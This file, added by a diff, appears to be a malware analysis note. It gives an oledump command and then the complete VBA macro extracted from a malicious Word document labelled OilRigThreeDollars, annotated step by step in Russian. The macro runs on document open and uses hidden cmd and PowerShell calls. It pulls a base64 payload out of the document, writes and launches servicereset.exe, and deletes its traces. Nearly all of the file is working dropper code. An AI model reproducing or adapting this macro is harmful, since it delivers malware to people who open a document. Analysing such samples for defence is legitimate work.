@@ -1,0 +1,95 @@
+python oledump.py -s 8 -v OilRigThreeDollars.bin
+
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Option Explicit
+Private Sub Document_Open()
+//Запуск команды cmd.exe /c echo powershell > "C:\Users\admin\AppData\Roaming\Pr.bin"
+Dim OoHHHD As String
+OoHHHD = Environ$("AppData") & "\Pr.bin"
+Shell Environ$("COMSPEC") & " /c echo powershell > " & " " & Chr(34) & OoHHHD & Chr(34), vbHide
+
+Dim JnQTSPz
+JnQTSPz = DateAdd("s", 2, Now())
+Do Until (Now() > JnQTSPz)
+Loop
+
+// eBUH= powershell, vbCrLf-символ возврата каретки и перенос на новую строку
+Dim hBLtBWN, eBUH
+Set hBLtBWN = CreateObject("ADODB.Stream")//для чтения других файлов
+hBLtBWN.Charset = "utf-8"
+hBLtBWN.Open
+hBLtBWN.LoadFromFile (OoHHHD)
+eBUH = hBLtBWN.ReadText()
+eBUH = Replace(eBUH, vbCrLf, vbNullString)
+
+//cmd.exe /c powershell Copy-Item 'C:\Users\admin\AppData\Local\Temp\OilRigThreeDollars.bin.doc' 'C:\Users\admin\AppData\Roaming\Tmp.doc'
+Dim COOgvrT As String
+COOgvrT = ThisDocument.FullName
+Dim ANYuGEOsm As String
+ANYuGEOsm = Environ$("AppData") & "\Tmp.doc"
+Dim xMjIQQ As String
+xMjIQQ = "Copy-Item " & Chr(39) & "%FilePath%" & Chr(39) & " " & Chr(39) & "%DestFolder%" & Chr(39)
+xMjIQQ = Replace(xMjIQQ, "%FilePath%", COOgvrT)
+xMjIQQ = Replace(xMjIQQ, "%DestFolder%", ANYuGEOsm)
+Shell Environ$("COMSPEC") & " /c " & eBUH & " " & xMjIQQ, vbHide
+
+// макрос считывает исходный документ, ищет в данных разделитель «### $$$», чтобы найти полезную нагрузку в кодировке base64, затем записывает кодированную полезную нагрузку в файл% APPDATA% \ Base.txt.
+
+Dim JnQTSPzC
+JnQTSPzC = DateAdd("s", 7, Now())
+Do Until (Now() > JnQTSPzC)
+Loop
+// RbnuKl =читаем из Tmp.doc
+Dim UbdhzXR, RbnuKl
+Set UbdhzXR = CreateObject("ADODB.Stream")
+UbdhzXR.Charset = "utf-8"
+UbdhzXR.Open
+UbdhzXR.LoadFromFile (ANYuGEOsm)
+RbnuKl = UbdhzXR.ReadText()
+Dim OaxIUyC As String
+
+Dim norhEFQN() As String
+norhEFQN = Split(RbnuKl, Chr(35) & Chr(35) & Chr(35) & Chr(36) & Chr(36) & Chr(36))
+Dim MyBase As String
+MyBase = norhEFQN(1)
+
+Dim lnBvO As String
+lnBvO = Environ$("AppData") & "\Base.txt"
+//запись в base.txt
+Dim JBvTxY
+Dim f
+Set JBvTxY = CreateObject("Scripting.FileSystemObject")
+Set f = JBvTxY.OpenTextFile(lnBvO, 2, True)
+f.write MyBase
+f.Close
+//создаем и записываем в exe
+Dim GBFiI As String
+GBFiI = Environ$("PUBLIC") & "\Libraries\servicereset.exe"
+Dim DAOvSAGaX As String
+DAOvSAGaX = "$DATA = [System.Convert]::FromBase64String([IO.File]::ReadAllText('%Base%'));[io.file]::WriteAllBytes('GBFiI',$DATA);Start-Process 'GBFiI'"
+DAOvSAGaX = Replace(DAOvSAGaX, "%Base%", lnBvO)//замена подстроки в строке
+DAOvSAGaX = Replace(DAOvSAGaX, "GBFiI", GBFiI)
+
+// cmd.exe /c powershell $DATA = [System.Convert]::FromBase64String([IO.File]::ReadAllText('C:\Users\admin\AppData\Roaming\Base.txt'));[io.file]::WriteAllBytes('C:\Users\Public\Libraries\servicereset.exe',$DATA);Start-Process 'C:\Users\Public\Libraries\servicereset.exe'
+Shell Environ$("COMSPEC") & " /c " & eBUH & " " & DAOvSAGaX, vbHide
+//удаление временных файлов base.txt pr.bin и tmp.doc
+Dim bNJTCGU As String
+bNJTCGU = "Remove-Item " & Chr(39) & "%File%" & Chr(39)
+bNJTCGU = Replace(bNJTCGU, "%File%", ANYuGEOsm)
+Shell Environ$("COMSPEC") & " /c " & eBUH & " " & bNJTCGU, vbHide
+
+bNJTCGU = "Remove-Item " & Chr(39) & "%File%" & Chr(39)
+bNJTCGU = Replace(bNJTCGU, "%File%", lnBvO)
+Shell Environ$("COMSPEC") & " /c " & eBUH & " " & bNJTCGU, vbHide
+
+bNJTCGU = "Remove-Item " & Chr(39) & "%File%" & Chr(39)
+bNJTCGU = Replace(bNJTCGU, "%File%", OoHHHD)
+Shell Environ$("COMSPEC") & " /c " & eBUH & " " & bNJTCGU, vbHide
+End Sub
